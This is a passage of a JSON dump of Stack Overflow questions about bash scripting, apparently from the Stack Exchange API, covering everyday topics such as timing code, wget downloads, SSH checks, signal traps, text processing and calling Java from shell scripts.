href=\"http://en.wikipedia.org/wiki/Plain%5FOld%5FDocumentation\" rel=\"nofollow\">POD</a> for shell scripting?\nthanks</p>\n\n<p>EDIT: I am not looking for existing shell man pages - there is a lot of ksh/bash code we write/support, so I was looking for a nice way to communicate what's happening, whether there is a potential for code reuse, etc. all things Javadocs are good for.</p>\n"},{"tags":["c","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12832945,"title":"Simple variable test","body":"<p>With Bash you can do a simple variable test like this</p>\n\n<pre><code>$ [ $foo ]; echo $?\n1\n\n$ foo=bar\n\n$ [ $foo ]; echo $?\n0\n</code></pre>\n\n<blockquote>\n  <p>The expression is true if and only if the argument is not null.</p>\n</blockquote>\n\n<p>What would be a similar test with C?</p>\n\n<h1>Edit</h1>\n\n<p>Lets say an <code>int</code> type for argument sake.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12820884,"title":"Print elapsed time in secs with three trailing digits","body":"<p>For a framework I'm writing I would like to measure how much a piece of (bash) code takes to execute and then print the elapsed time in seconds.</p>\n\n<p>For measuring, I do the following:</p>\n\n<pre><code>start=$(date +%s%N)\n\n# do something here\n\nelapsed_time=$(($(date +%s%N) - start))\n</code></pre>\n\n<p>This gives me the elapsed seconds concatenated with the elapsed nanos. If I now divide this by 1000000, I'll get the time in ms</p>\n\n<pre><code>elapsed_time_in_ms=$(($elapsed time / 1000000))\n</code></pre>\n\n<p>This is all nice and seems to work but the real problem is that I want to print it in this format:</p>\n\n<pre><code>12.789s\n</code></pre>\n\n<p>where before the <code>.</code> are the seconds and after the dot are last 3 digits of the ms value.</p>\n\n<p>How would I achieve something like that?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I am aware that the time would probably not of much use, still I would like to implement this (even if only for cosmetic reasons :-)).</p>\n"},{"tags":["bash","image","shell","download","wget"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1606,"score":0,"question_id":1548653,"title":"Shell script (mac): How to download files from a directory using wget and regular expression?","body":"<p>I'm trying to download images (.jpg) from web folder using wget. I want to download only images, which have a certain sentences in file name. This works fine </p>\n\n<pre><code>wget -r -nd -A .jpg http://www.examplewebsite.com/folder/\n</code></pre>\n\n<p>but I like to include a sentence eg. \"john\". I tried </p>\n\n<pre><code>wget -r -nd -A .jpg '*john*' http://www.examplewebsite.com/folder/\n</code></pre>\n\n<p>with no success. Any ideas how to proceed? Could this be implemented into a shell script (bash shell). I'm using Mac OSX 10.6.1.</p>\n"},{"tags":["bash","sudo","zenity"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":122,"score":0,"question_id":11729761,"title":"Zenity entry and sudo -S not working properly without shell","body":"<p>I have problem with <code>zenity entry</code> and <code>sudo -S</code>.</p>\n\n<p>I am doing something like this:</p>\n\n<pre><code>zenity --entry --title 'title' --text 'text' --hide-text | sudo -S pm-suspend\n</code></pre>\n\n<p>If I run this in shell, it's working. But I put it into file and I am launching this script with key shortcut. It's not working! </p>\n\n<p>I've tried to replace <code>pm-suspend</code> with my own script, which prints <code>id -u</code> to file. But no file was created.</p>\n\n<p>Any ideas, where could be a problem? Thank you</p>\n"},{"tags":["osx","bash","command-line","operating-system","jpeg"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12831293,"title":"How to recursivly use JpegTran (command line) to optimise all files in subdirs?","body":"<p>i have Photos in multiple directories. I want to use jpegtran (command line tool) to recursivly go through each one, optimise it, and save it (overwrite it)</p>\n\n<p>if they are all in one folder i use this</p>\n\n<pre><code>for JPEG in *.jpg ; do jpegtran -optimize $JPEG &gt; $JPEG; done\n</code></pre>\n\n<p>but i can't get it working recursivly and overwriting the same file (rather than to a new filename)</p>\n\n<p>any tips?</p>\n"},{"tags":["bash","ssh","connection"],"answer_count":4,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":6828,"score":6,"question_id":1405324,"title":"How to create a bash script to check the SSH connection?","body":"<p>I am in the process of creating a bash script that would log into the remote machines and create private and public keys.</p>\n\n<p>My problem is that the remote machines are not very reliable, and they are not always up. I need a bash script that would check if the SSH connection is up. Before actually creating the keys for future use.</p>\n"},{"tags":["bash","shell","scripting","sed","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":60,"score":-1,"question_id":12828542,"title":"how to print user1 from user1@10.129.12.121 using shell scripting or sed","body":"<p>I wanted to print the name from the entire address by shell scripting. So user1@12.12.23.234 should give output \"user1\" and similarly 11234@12.123.12.23 should give output 11234</p>\n"},{"tags":["bash","shell","capitalization"],"answer_count":6,"favorite_count":2,"up_vote_count":20,"down_vote_count":0,"view_count":5412,"score":20,"question_id":673055,"title":"Correct Bash and shell script variable capitalization","body":"<p>I run across many shell scripts with variables in all caps, and I've always thought that there is a severe misunderstanding with that.  My understanding is that, by convention (and perhaps by necessity long ago), <strong>environment variables</strong> are in all-caps.</p>\n\n<p>But in modern scripting environments like Bash, I have always prefered the convention of lower-case variables for temporary variables, and upper-case variables <em>only for exported (i.e. environment) variables</em>.  For example:</p>\n\n<pre><code>#!/usr/bin/env bash\nyear=`date +%Y`\necho \"It is $year.\"\nexport JAVA_HOME=\"$HOME/java\"\n</code></pre>\n\n<p>That has always been my take on things.  Are there any authoritative sources which either agree or disagree with this approach, or is it purely a matter of style?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12828967,"title":"Bash Script Quit without throwing exit","body":"<p>hey guys I've had an issue of terminating my terminal (ssh) when exit is \nthrown in a script and am hoping for a way around it, here's an example</p>\n\n<pre><code># ssh name@host\n$ program\n\n    # program contents\n\n    #!/bin/bash\n    program()\n    {\n        exit 0\n    }\n\nexit\nConnection to host closed.\n# gfd =(\n</code></pre>\n\n<p>this kicks me back to my local terminal, is there a way to exit/quit without losing my session?</p>\n"},{"tags":["osx","bash","terminal","stty"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":61,"score":3,"question_id":12827888,"title":"What is the representation of the mac command key in the terminal?","body":"<p>Like control key is represented by a '^' in the terminal, what is the equivalent for the command key (mac)?</p>\n\n<p>I am trying to remap my bash shortcuts using stty</p>\n\n<p>For eg</p>\n\n<p>stty eof ^D</p>\n\n<p>But instead of control, I want to use the command key. </p>\n\n<p>EDIT:</p>\n\n<p>Okay so the issue I was trying to solve was that I wanted to interchange command and control keys because I work on osx and linux and the different key combinations cause me a lot of pain.</p>\n\n<p>So I interchanged the modifier keys using osx preferences. But now all the bash shortcuts like Ctrl+C etc had become equivalent of using the key sequences 'cmd+c' - which is not acceptable.</p>\n\n<p>Thankfully iTerm2, supports remapping of modifier keys as well, so for iterm2 I reversed them again which means iTerm2 recognizes command as command and control as control. </p>\n\n<p>So problem solved for now.</p>\n"},{"tags":["bash","tail"],"answer_count":13,"favorite_count":5,"up_vote_count":10,"down_vote_count":0,"view_count":6802,"score":10,"question_id":2041437,"title":"Ending tail -f started in a shell script","body":"<p>I have the following.</p>\n\n<ol>\n<li>A Java process writing logs to the stdout </li>\n<li>A shell script starting the Java process </li>\n<li>Another shell script which executes the previous one and redirects the log</li>\n<li>I check the log file with the <code>tail -f</code> command for the success message.</li>\n</ol>\n\n<p>Even if I have exit 0 in the code I cannot end the <code>tail -f</code> process.</p>\n\n<p>Which doesn't let my script to finish. Is there any other way of doing this in Bash?</p>\n\n<p>The code looks like the following.</p>\n\n<pre><code>function startServer() {\n  touch logfile\n  startJavaprocess &gt; logfile &amp;\n\n  tail -f logfile | while read line \n  do\n    if echo $line | grep -q 'Started'; then\n      echo 'Server Started'\n      exit 0\n    fi\n  done\n}\n</code></pre>\n"}]}
{"total":16352,"page":12,"pagesize":100,"questions":[{"tags":["linux","bash","web","wget","hotlinking"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12828299,"title":"Wget: How to bypass \"hotlinking\" protected image","body":"<p>Is it possible to bypass \"hotlink\" image protection? i'm not trying to post it on other sites just to download.\nwhen i download the following image, using wget:</p>\n\n<pre><code>http://comicsbook.ru/upload/%D0%9A%D0%BE%D0%BC%D0%B8%D0%BA%D1%81-Trollface-%D0%9D%D0%B0-%D0%B1%D0%BE%D1%80%D1%82%D1%83-70813.jpg\n</code></pre>\n\n<p>I'm getting redirected to:</p>\n\n<pre><code>http://comicsbook.ru/trollface/70813?na-bortu\n</code></pre>\n\n<p>I have no idea where to start.\nWhat I've tried so far:</p>\n\n<pre><code>curl \"http://comicsbook.ru\" -s -L -b cookie.c -c cookie.c -b \"$COOKIEPAR\" &gt; index.$TEMP\nwget http://comicsbook.ru/upload/%D0%9A%D0%BE%D0%BC%D0%B8%D0%BA%D1%81-Trollface-%D0%9D%D0%B0-%D0%B1%D0%BE%D1%80%D1%82%D1%83-70813.jpg\n</code></pre>\n"},{"tags":["linux","bash","shell","unix","ssh"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12827574,"title":"Is is possible to pipe the output of a command from a server to a local machine?","body":"<p>I have a series of functionally identical servers provided by my school that run various OS and hardware configurations. For the most part, I can use 5 of these interchangeably. Unfortunately, other students tend to bunch up on some machines and It's a pain to find one that isn't bogged down.</p>\n\n<p>What I want to is ssh into a machine, run the command: </p>\n\n<pre><code>w | wc -l\n</code></pre>\n\n<p>to get a rough estimate of the load on that server, and use that information to select the least impacted one. A sort of client-side load balancer.</p>\n\n<p>Is there a way to do this or achieve the same result?</p>\n"},{"tags":["linux","bash","shell"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":774,"score":0,"question_id":7022390,"title":"Bash- how to read only the last line but one from a file?","body":"<p>I have a file that has following last three lines. I want need to retrive onle the last but one line i.e. <code>100.000;8438;    06:46:12</code>, but i do not know the line number of that line. How can i retrieve it using shell-scripts? Thanks in advance for your help.</p>\n\n<pre><code>.\n.\n.\n99.900; 8423;   06:44:41\n100.000;8438;   06:46:12\nNumber of patterns: 8438\n</code></pre>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12821302,"title":"Split a string only by spaces that are outside quotes","body":"<p>I know, this was asked a bilion times, but i yet did not find the optimal solution for my specific case.</p>\n\n<p>I'm receving a string like this:</p>\n\n<pre><code>VAR1=\"some text here\" VAR2='some another text' some script --with --some=args\n</code></pre>\n\n<p>how do i split the string like this: (most preferable in pure bash)</p>\n\n<pre><code>VAR1=\"some text here\"\nVAR2='some another text'\nsome script --with --some=args\n</code></pre>\n\n<p><code>set -- $str</code> result in <code>VAR1=\"some</code></p>\n\n<p><code>set -- \"$str\"</code> returns entire string</p>\n\n<p><code>eval set -- \"$str\"</code> result in <code>VAR1=some text here</code></p>\n\n<p>sure, i could add quotes to the string returned by <code>eval</code>, but i get highly untrusted input so <code>eval</code> is not a option at all.</p>\n\n<p>Important: there can be from zero to unlimited VARs and they can be single or double quoted</p>\n\n<p>Also, the <code>VAR</code> is a fake name here, it can in fact be anything.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sqlite","bash"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12825431,"title":"Combine two SQLite databases in bash","body":"<p>I have two databases that are created in a bash file, let's call them <code>1.sqlite</code> and <code>2.sqlite</code>.  I'd like to combine them into a new database (<code>3.sqlite</code>).  Is there a command in bash that'll do that?</p>\n\n<p>Edit:</p>\n\n<p>The answer that sputnick gave me got me on the right track.  But I had to rearrange it to be:</p>\n\n<pre><code>sqlite3 1.sqlite .dump &gt; tempdb.sqlite\n</code></pre>\n"},{"tags":["linux","bash","shell","powershell"],"answer_count":9,"favorite_count":8,"up_vote_count":22,"down_vote_count":1,"view_count":1822,"score":21,"question_id":933445,"title":"A better Linux shell?","body":"<p>I use bash, and have done so for over a decade - but occasionally I wonder whether there has been any significant new developments in the world of Linux shells.</p>\n\n<p>A few years back Microsoft released PowerShell, which seemed very interesting.  Is there any comparable innovation going on in Linux shells?</p>\n"},{"tags":["bash","unix","process","eval","pid"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":5934,"score":3,"question_id":4339756,"title":"Inside a bash script, how to get PID from a program executed when using the eval command?","body":"<p>I have commands in a bash script that are similar to this:</p>\n\n<pre><code>eval \"( java -classpath ./ $classname ${arguments[@]} $redirection_options $file )\" &amp;\npid=$!\n</code></pre>\n\n<p>However if I do a <code>ps $pid</code> it shows the main script process instead of the process of the java program.</p>\n\n<p>It obtains the correct process when I omit the eval, but in order to get some of the complicated arguments to work correctly I need to use it.</p>\n\n<p>Any idea of how I can get the PID of the java program when it's executed within an eval command?</p>\n"},{"tags":["bash","grep"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":30,"score":2,"question_id":12826393,"title":"What is the difference between grep -e and grep -E option?","body":"<p>I am trying to understand the difference between <code>grep -e</code> and <code>grep -E</code>. Now from <code>grep manpage</code> I got:</p>\n\n<blockquote>\n  <p>-E, --extended-regexp </p>\n  \n  <p>Interpret PATTERN as an extended regular expression (see below).</p>\n  \n  <p>-e PATTERN, --regexp=PATTERN </p>\n  \n  <p>Use PATTERN as the pattern; useful to protect patterns beginning with -</p>\n</blockquote>\n\n<p>The above explanation might be clear to a regex/grep experienced user but for a beginner like me it makes no sense.</p>\n\n<p>So, can someone explain it to me using <code>examples</code> what is the difference between the two  and when to use which option.</p>\n\n<p>PS: Version: grep (GNU grep) 2.10</p>\n"},{"tags":["linux","bash","signals","trap"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":64,"score":5,"question_id":12824637,"title":"Bash script: can not properly handle SIGTSTP","body":"<p>I have a bash script that mounts and unmounts a device, which performing some read operations in between. Since the device is very slow, the script takes about 15 seconds to complete (the mount taking atleast 5-6 seconds). Since leaving this device mounted can cause other problems, I don't want this script to be interrupted.</p>\n\n<p>Having said that, I can correctly handle SIGINT (Ctrl+c), but when I try to handle SIGTSTP (Ctrl+z), the script freezes. Which means the signal is trapped but the handler doesn't run.</p>\n\n<pre><code>#!/bin/sh\ncleanup()\n{\n    # Don't worry about unmounting yet. Just checking if trap works.\n    echo \"Quitting...\" &gt; /dev/tty\n    exit 0\n}\ntrap 'cleanup' SIGTSTP\n...\n</code></pre>\n\n<p>I manually have to send the KILL signal to the process. Any idea why this is happening and how I can fix it?</p>\n"},{"tags":["bash","amazon-ec2","ec2-ami","ec2-api-tools"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":132,"score":1,"question_id":12268986,"title":"shell script to set amazon ec2 hostname from tags","body":"<p>I am trying to set amazon EC2 hostname from the tag \"Name\"</p>\n\n<p>And found <a href=\"http://stackoverflow.com/a/7122649/957423\">the answer</a> to extract tags from instance data.</p>\n\n<pre><code>ec2-describe-tags \\\n  --filter \"resource-type=instance\" \\\n  --filter \"resource-id=$(ec2-metadata -i | cut -d ' ' -f2)\" \\\n  --filter \"key=Name\" | cut -f5\n</code></pre>\n\n<p>the result is:</p>\n\n<pre><code>+------------+--------------+------+--------+\n| resourceId | resourceType | key  | value  |\n+------------+--------------+------+--------+\n| i-1xxxxxxx | instance     | Name | dev200 |\n+------------+--------------+------+--------+\n</code></pre>\n\n<p>I can see that I am almost there, but how do I get the value(dev200) from the result above?  Then I can use it in:</p>\n\n<pre><code>echo $HOSTNAME &gt; /etc/hostname\n</code></pre>\n\n<p>p.s. I have BASH on the instance, but I am completely lost in the <a href=\"http://www.tldp.org/LDP/abs/html/\" rel=\"nofollow\">bash document</a>. can someone point me to the correct paragraph?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":57,"score":3,"question_id":12812154,"title":"paste command in bash doesn't append to end of file","body":"<p>One file has 3 columns and looks like this:</p>\n\n<pre><code>1   249250621   225280621   \n2   243199373   238207373   \n3   198022430   194797140   \n4   191154276   187661676   \n5   180915260   177695260   \n6   171115067   167395067   \n7   159138663   155353663   \n8   146364022   142888922   \n9   141213431   120143431   \n10  135534747   131314747   \n11  135006516   131129516   \n12  133851895   130481895   \n13  115169878   95589878    \n14  107349540   88289540    \n15  102531392   81694769    \n16  90354753    78884753    \n17  81195210    77795210    \n18  78077248    74657248    \n19  59128983    55808983    \n20  63025520    59505520    \n21  48129895    35108702    \n22  51304566    34894566    \nX   155270560   151100560   \nY   59373566    25653566    \n</code></pre>\n\n<p>My other file looks like:</p>\n\n<pre><code>5677533\n4506000\n2272564\n2753699\n4015846\n2163243\n3812595\n2885199\n8064159\n3522086\n2006115\n1490517\n1072244\n1423429\n3009679\n2705191\n1479591\n800436\n929876\n648000\n347993\n972862\n7812943\n9660863\n</code></pre>\n\n<p>When I try</p>\n\n<p>paste file1.txt file2.txt > file3.txt</p>\n\n<p>I get:</p>\n\n<pre><code>1   567753321   225280621   \n2   450600073   238207373   \n3   227256430   194797140   \n4   275369976   187661676   \n5   401584660   177695260   \n6   216324367   167395067   \n7   381259563   155353663   \n8   288519922   142888922   \n9   806415931   120143431   \n10  352208647   131314747   \n11  200611516   131129516   \n12  149051795   130481895   \n13  107224478   95589878    \n14  142342940   88289540    \n15  300967992   81694769    \n16  27051913    78884753    \n17  14795910    77795210    \n18  80043648    74657248    \n19  92987683    55808983    \n20  64800020    59505520    \n21  34799395    35108702    \n22  97286266    34894566    \nX   781294360   151100560   \nY   96608636    25653566\n</code></pre>\n\n<p>The data from file2.txt overwrites the 2nd column in file 1.  I want the data in file2.txt to be appended to the end in a new column, separated by a tab in file1.txt into the new file3.txt.  But it does not seem to be working.  Thoughts?  Thanks.</p>\n\n<p>Edit: For file2, I can create it with the same first column index 1-22, x, y.  But then when I try to join, it doesn't work either.  This is my output on join:</p>\n\n<pre><code>1 249250621 225280621\n 5677533\n2 243199373 238207373\n 4506000\n3 198022430 194797140\n 2272564\n4 191154276 187661676\n 2753699\n5 180915260 177695260\n 4015846\n6 171115067 167395067\n 2163243\n7 159138663 155353663\n 3812595\n8 146364022 142888922\n 2885199\n9 141213431 120143431\n 8064159\n10 135534747 131314747\n 3522086\n11 135006516 131129516\n 2006115\n12 133851895 130481895\n 1490517\n13 115169878 95589878\n 1072244\n14 107349540 88289540\n 1423429\n15 102531392 81694769\n 3009679\n16 90354753 78884753\n 2705191\n17 81195210 77795210\n 1479591\n18 78077248 74657248\n 800436\n19 59128983 55808983\n 929876\n20 63025520 59505520\n 648000\n21 48129895 35108702\n 347993\n22 51304566 34894566\n 972862\nX 155270560 151100560\n 7812943\nY 59373566 25653566 9660863\n</code></pre>\n"},{"tags":["bash","shell","newline","text-processing"],"answer_count":7,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1454,"score":3,"question_id":4594319,"title":"shell replace cr\\lf by comma","body":"<p>I have input.txt</p>\n\n<pre><code>1\n2\n3\n4\n5\n</code></pre>\n\n<p>I need to get such output.txt</p>\n\n<pre><code>1,2,3,4,5\n</code></pre>\n\n<p>How to do it?</p>\n"},{"tags":["bash","ssh","ping"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":3559,"score":4,"question_id":1727907,"title":"how to use ping in a script","body":"<p>I want a bash script that'll do:</p>\n\n<pre><code>for c in computers:\ndo\n   ping $c\n   if ping is sucessfull:\n      ssh $c 'check something'\ndone\n</code></pre>\n\n<p>If I only do <code>ssh</code> and the computer is iresponsive, it takes forever for the timeout. So I was thinking of using the output of <code>ping</code> to see if the computer is alive or not. How do I do that? Other ideas will be great also </p>\n"},{"tags":["python","bash","variables","autocomplete"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":69,"score":3,"question_id":12822777,"title":"How to use the bash command 'read -e variable' and pass the variable to a python variable","body":"<p>I'd like to pass shell input to a variable in python. Normally I would use the <code>raw_input()</code> method for this, but I'd like to use something which allows me to \"browse\" through my folders.  </p>\n\n<p>In a bash script I'd use something like this: (The -e allows me use the \"autocomplete\" function of the shell via Tab.)</p>\n\n<pre><code>#!/bin/bash\n\necho Please input the path to the file:\n\nread -e var\n\necho $var\n</code></pre>\n\n<p>Does anyone know how to solve this in Python? I looked at <code>os.popen()</code> and <code>os.system()</code> but cannot figure out how to use them.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":85,"score":2,"question_id":12821715,"title":"convert string into integer in bash script","body":"<p>In a text file, test.txt, I have the next information:</p>\n\n<pre><code>sl-gs5 desconnected Wed Oct 10 08:00:01 EDT 2012 1001\n</code></pre>\n\n<p>I want to extract the hour of the event by the next command line:</p>\n\n<pre><code>hour=$(grep -n sl-gs5 test.txt | tail -1 | cut -d' ' -f6 | awk -F \":\" '{print $1}')\n</code></pre>\n\n<p>and I got \"08\". When I try to add 1,</p>\n\n<pre><code> 14 echo $((hour+1))\n</code></pre>\n\n<p>I receive the next error message:</p>\n\n<pre><code>./test2.sh: line 14: 08: value too great for base (error token is \"08\")\n</code></pre>\n\n<p>If variables in Bash are untyped, why?</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":12790255,"title":"BASH: ls first 5 from $PATH without displaying errors","body":"<p>I'm starting with bash at university, anyone has any idea how to solve that problem:</p>\n\n<p>Show first 5 files for each directory from $PATH variable, if some directory doesn't exist, don't show error message.</p>\n\n<p>Solution can be something like:</p>\n\n<p><code>ls -a ``echo $PATH | sed \"s/:/ /g\"`` 2&gt; /dev/null</code></p>\n\n<p>it works, maybe there exists other option but I don't know how to limit results by 5 per each show block?</p>\n"},{"tags":["perl","excel","bash","datetime","command-line"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":110,"score":2,"question_id":11289445,"title":"tool/script to test datetime intervals on bash command line","body":"<p>I have sorted data that look like this (dumped from MS Excel to commandline  with <em>ssgrep</em>):</p>\n\n<pre><code>2012-06-27T22:55:00\n2012-06-27T23:00:00\n2012-06-27T23:05:00\n2012-06-27T23:10:00\n2012-06-27T23:15:00\n2012-06-27T23:20:00\n2012-06-27T23:25:00\n2012-06-27T23:30:00\n</code></pre>\n\n<p>Now I want to pipe this into a script (or any command line tool) which tests whether all values are indeed valid dates, and if there are any gaps between them that are not 5-minute intervals. (I need to do the same with different datasets sampled at 1 hour intervals)</p>\n\n<p>Is there a tool available for the command line that can do this? \nI know it's easy to write a little script in R or in Perl (in fact I have already started to program this). But maybe there is already a little utility pre-installed on linux/solaris that I don't know about.</p>\n"},{"tags":["bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":76,"score":3,"question_id":10022422,"title":"How to take string from a file name and use it as an argument","body":"<p>If a file name is in this format</p>\n\n<pre><code>assignment_number_username_filename.extension\n</code></pre>\n\n<p>Ex.</p>\n\n<pre><code>assignment_01_ssaha_homework1.txt\n</code></pre>\n\n<p>I need to extract just the username to use it in the rest of the script.</p>\n\n<p>How do I take just the username and use it as an argument.</p>\n\n<p>This is close to what I'm looking for but not exactly:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/1999682/extracting-a-string-from-a-file-name\">Extracting a string from a file name</a></p>\n\n<p>if someone could explain how sed works in that scenario that would be just as helpful!</p>\n\n<p>Here's what I have so far; I haven't used <code>cut</code> in a while so I'm getting error messages while trying to refresh myself.</p>\n\n<pre><code> #!/bin/sh \n a = $1\n grep $a /home | cut -c 1,2,4,5 echo $a`\n</code></pre>\n"},{"tags":["python","bash","shell","awk","text-processing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":122,"score":0,"question_id":10738914,"title":"comparing values in multiple files","body":"<p>I have two files and each file has 3  columns and n number of rows (different number of rows in each file).  </p>\n\n<p>each looks like this:</p>\n\n<pre><code>file1\nchr1    12  32 \nchr1    14  30\nchr3    10002  89000 \nchrx    5678900   987654\n</code></pre>\n\n<p>and this:</p>\n\n<pre><code>file2\nchr1    8   15\nchr1    10  14\nchr1    32  34\n</code></pre>\n\n<p>the second and third column in each file represent the starting and ending values while the first column is a name.</p>\n\n<p>Hence, if the value in first column (of file 1) matches to the value in first column of file 2  and then script should compute if their exists an overlap (any degree of overlap of the value range in column 2 and 3 in file1 with value range in column 2 and 3 of file 2) of the range of value in second and third column from  file 1 in file2.  </p>\n\n<p>An output like this is desired:</p>\n\n<pre><code>regions from file1 present in file 2\n\nchr1    12  32   present \nchr1    14  30   present \nchr3    10002  89000  absent\nchrx    5678900   987654 absent\n</code></pre>\n\n<p>Any suggestions for awk manipulation or python script...please help.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":54,"score":2,"question_id":12819795,"title":"How to selectively replace spaces in a string with Bash only","body":"<p>I have this string:</p>\n\n<pre><code>str='1 2 3 var=\"foo bar\" 4 5 6'\n</code></pre>\n\n<p>Also it could be like this:</p>\n\n<pre><code>str=\"1 2 3 var='foo bar' 4 5 6\"\n</code></pre>\n\n<p>How would I replace spaces with <code>+</code> only inside quotes(double or single)?</p>\n\n<p>The result should be like:</p>\n\n<pre><code>1 2 3 var=\"foo+bar\" 4 5 6\n</code></pre>\n\n<p>or</p>\n\n<pre><code>1 2 3 var='foo+bar' 4 5 6\n</code></pre>\n\n<p>In case the var is single quoted.</p>\n\n<p><code>var</code> can be anything, it is not strong match.\nAlso it could be missing at all, like this:</p>\n\n<pre><code>str='1 2 3 \"foo bar\" 4 5 6'\n</code></pre>\n\n<p>I don't want to use awk, sed, or perl to do this.</p>\n"},{"tags":["bash","shell","script","while-loop","break"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12816151,"title":"bash script: commands after the loop are not executed if the loop condition is false","body":"<p>I have a strange behavior in my script bash. when the while condition is true the script behaves correctly but if it's false the commands after the loop aren't executed at all and the script stops. There is no break in my commands after the loop. \nI cannot see where is the problem! Any help is welcome :)\nThanks in advance.</p>\n\n<pre><code>while  [ expression1 ] || [ expression2 ]  \ndo\n            echo in the loop\n            if  [ expression3 ] &amp;&amp; [ expression4 ] ;\n            then\n                    commands..   \n                    break;\n            fi\n            commands..\ndone\ncommands..\necho out from the loop\n</code></pre>\n\n<p>Real code:</p>\n\n<pre><code>start_t=`grep Start_t $job_template | awk -F= '{print $2}'`\ncurrent_date=`date +%s`\nprogress_t=`expr $current_date - $start_t`\nexec_t=`grep Exec_t $job_template | awk -F= '{print $2}'`\n\nrunning_state=\"r\"\nreq_state $job_id # get the state \nxml_state=` grep \"job_id=$job_id\" $list_job_file | awk '{print $4}'`\nwhile  [ $state = $running_state ] || [ $xml_state = \"stoped\" ]  \n    do\n            echo in the loop\n            if  [ \"$xml_state\" = \"running\" ] &amp;&amp; [ $progress_t  -gt $exec_t ] ;\n            then\n                    kill_job $job_id\n                    update_status $job_template \"killed\"\n                    echo The job is killed    \n                    break;\n            fi\n\n            sleep $sleeping_t\n\n            $req_state  $job_id # to update the state\n            echo state $state\n            xml_state=` grep \"job_id=$job_id\" $list_job_file | awk '{print $4}' `\n            echo xml_state $xml_state\n            start_t=`grep Start_t $job_template | awk -F= '{print $2}'`\n            current_date=`date +%s`\n            progress_t=`expr $current_date - $start_t`\n    done\necho out from the loop\ncommands..\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12819319,"title":"summing values ​​of variables in bash","body":"<p>i'm trying to get all the regular files opened by all the processes in the current session. I have this code</p>\n\n<pre><code>while read pid\ndo\n\n        FILES_ACTUAL=$(lsof -p $pid | grep REG | wc -l)   \n\n\ndone &lt; &lt;(ps -o pid,tt -u $USER | grep $CURRENT_TERMINAL | awk '{print $1}')\n\necho $FILES_ACTUAL\n</code></pre>\n\n<p>but i dont know how to add up, inside the while,  the variable $FILES_ACTUAL..\nI tried to use the awk command, but i couldn´t do it.</p>\n"},{"tags":["java","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12819154,"title":"How to get java output in shell","body":"<p>I have a shell script <strong>run.sh</strong> which is executing a jar file. </p>\n\n<pre><code>#!/bin/bash\n\"$JAVA_HOME\"/bin/java -jar test.jar $1 $2 $3\n</code></pre>\n\n<p>After doing all the process in java I need to execute a command. So my java method calls a\nshell script by passing it some arguments. </p>\n\n<pre><code>public static void Test(String Arg1, int Arg2, int Arg3, String Arg4) throws IOException, InterruptedException {\n\n            File currentLocation = new File(Test.class.getProtectionDomain().getCodeSource().getLocation().getPath());\n\n            String executeShellScript = currentLocation.getParentFile().toString() + \"/out.sh\";\n\n           //SOME LOGIC\n\n            ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\",executeShellScript,arg1, arg2, arg3, arg4);\n            pb.redirectErrorStream(true);\n\n            Process p = pb.start();\n            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n            String line = null;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line);\n            }\n\n        }\n</code></pre>\n\n<p>And in my out.sh I take in the arguments and execute a command.</p>\n\n<pre><code>#!/bin/bash\n\nIMAGE=$1\nROW=$2\nCOLUMN=$3\nDESTINATION=$4\necho $IMAGE\n</code></pre>\n\n<p>I was wondering if I could execute and process the output of my jar from the same script (run.sh) by getting all the 